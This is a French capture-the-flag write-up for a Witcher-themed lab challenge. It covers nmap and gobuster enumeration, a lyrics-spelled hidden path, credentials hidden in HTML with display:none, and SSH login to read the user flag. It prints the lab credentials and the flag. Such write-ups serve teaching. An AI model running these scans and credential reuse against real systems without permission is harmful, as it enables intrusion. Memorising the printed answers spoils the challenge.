Toss a Coin #1
> **Catégorie :** Web / Énumération créative / Credentials cachés
> **Cible :** `10.10.0.2`
> **Flag :** `EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}`
---
Objectif
Un serveur web sur le thème The Witcher cache un chemin secret construit à
partir des paroles d'une chanson (« Toss a Coin to Your Witcher »). Le but est
de reconstituer ce chemin, d'y trouver des identifiants dissimulés dans le HTML,
puis de se connecter en SSH pour récupérer le flag utilisateur.
Le vrai twist du challenge : l'arborescence n'est pas une énumération
classique de répertoires, mais une phrase épelée caractère par caractère.
---
1. Reconnaissance avec Nmap
```bash
nmap -sV -sC 10.10.0.2
```
Résultat :
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
```
Deux services à retenir :
22/tcp → SSH (notre porte de sortie une fois les identifiants trouvés)
80/tcp → HTTP, avec pour titre de page « Toss a coin to your witcher »
---
2. Énumération HTTP avec Gobuster
```bash
gobuster dir -u http://10.10.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```
Options :
`dir` → énumération de répertoires/fichiers
`-u` → URL cible
`-w` → wordlist (ici SecLists `common.txt`)
`-x php,html,txt` → extensions testées sur chaque mot
`-t` → nombre de threads (facultatif)
Premières découvertes :
```
/img/          → 301
/t/            → 301
/index.html    → 200
/server-status → 403
```
Le répertoire `/t/` est inhabituel (un seul caractère) → il attire l'attention.
---
3. Analyse de la page principale
```bash
curl -s http://10.10.0.2/
```
```html
<!DOCTYPE html>
<head>
    <title>Toss a coin to your witcher</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Toss a coin to your witcher</h1>
    <p>Don't fight it, you know you want to sing it, it might even help you out.</p>
    <img src="/img/jaskier.jpg" style="height: 40rem;">
</body>
```
La phrase « you know you want to sing it, it might even help you out »
est un indice : les paroles de la chanson de Jaskier vont servir à quelque chose.
---
4. Énumération de `/t/` (le déclic)
On énumère sous `/t/` :
```bash
gobuster dir -u http://10.10.0.2/t/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```
→ Découverte : `/o/ → 301`
Puis sous `/t/o/` :
```bash
gobuster dir -u http://10.10.0.2/t/o/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```
→ Découverte : `/s/ → 301`
On obtient donc progressivement :
```
/t/o/s/
```
---
5. Compréhension de l'énigme
Les fragments `t`, `o`, `s` mis bout à bout donnent le début de « toss » —
le titre du challenge. Une page indique aussi :
```
"Do you know the lyrics? this one is pretty famous!"
```
Déduction : chaque répertoire est un caractère des paroles, avec `_` pour
représenter les espaces. Plutôt que d'énumérer répertoire par répertoire (long et
fastidieux), on reconstruit le chemin à partir des paroles :
```
toss a coin to your witcher oh valley of plenty
```
devient le chemin :
```
/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
```
> **Le point clé :** l'arborescence n'est pas une énumération classique — c'est une
> **wordlist déguisée en chemin**, basée sur les paroles. On gagne un temps énorme
> en devinant la suite plutôt qu'en brute-forçant caractère par caractère.
---
6. Découverte de la page finale
On vérifie le chemin complet avec Gobuster :
```bash
gobuster dir -u 'http://10.10.0.2/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/' \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```
→ `index.html (Status: 200) [Size: 371]`
On récupère son contenu :
```bash
curl -i 'http://10.10.0.2/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/'
```
```html
<p>"So you DO know the lyrics. Well, good for you!"</p>
<img src="/img/jaskier2.jpg" style="height: 40rem;">
<p style="display: none;">jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose</p>
```
Le `style="display: none;"` cache visuellement un élément dans le navigateur,
mais il reste présent dans le HTML — donc visible avec `curl`.
```
Username: jaskier
Password: YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```
> **Leçon :** `display: none` n'est **pas** un moyen de cacher un secret. Le
> contenu est toujours dans le code source, accessible à quiconque lit le HTML brut.
---
7. Accès SSH
On réutilise le port 22 repéré par Nmap avec les identifiants trouvés :
```bash
ssh jaskier@10.10.0.2
# mot de passe : YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```
→ Connexion réussie :
```
jaskier@the_continent:~$
```
---
8. Récupération du flag utilisateur
```bash
ls
# toss-a-coin.py
# user.txt

cat user.txt
```
→ Flag :
```
EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}
```
---
Concepts clés à retenir
Concept	Explication
Énumération web (Gobuster)	Découvre les chemins non liés à partir d'une wordlist.
Chemin sémantique	Ici l'arborescence encode une phrase, pas des dossiers classiques — reconnaître le pattern évite le brute-force.
`display: none` ≠ secret	Le CSS cache l'affichage, pas le code source. `curl` révèle tout.
Réutilisation d'identifiants	Des creds trouvés côté web servent souvent tel quel pour SSH.
Lire le HTML brut	Toujours `curl` / Ctrl+U : les indices sont souvent invisibles à l'écran.
---
Résumé de la chaîne d'attaque
```
nmap (22/80) → gobuster / → /t/ → /t/o/ → /t/o/s/ →
énigme "lyrics" → reconstruction du chemin complet (paroles) →
page cachée → creds jaskier en display:none →
ssh jaskier → user.txt → FLAG
```